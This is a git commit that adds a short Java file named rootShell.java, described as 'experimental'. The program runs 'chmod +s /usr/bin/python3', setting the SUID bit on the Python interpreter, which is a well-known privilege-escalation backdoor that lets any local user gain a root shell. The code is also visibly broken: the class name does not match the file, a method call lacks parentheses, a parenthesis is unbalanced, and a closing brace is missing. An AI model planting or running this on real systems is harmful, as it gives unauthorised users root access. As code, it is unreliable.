553df5f9ba4d5c4eeff7642370347a97123cf710
thatsmellything <thesmelliestman@gmail.com>
2021-04-29 14:11:11 -0600

    Added experimental rootShell java class

---
+++ rootShell.java
@@ -0,0 +1,21 @@
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.IOException;
+
+public class python {
+	public static void main(String[] args){
+		String command = "chmod +s /usr/bin/python3";
+		
+		try {
+			Process process = Runtime.getRuntime().exec(command);
+			BufferedReader reader = new BufferedReader(
+				new InputStreamReader(process.getInputStream)));
+			String line;
+			while  ((line = reader.readLine()) != null) {
+				System.out.println(line);
+			}
+			reader.close();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
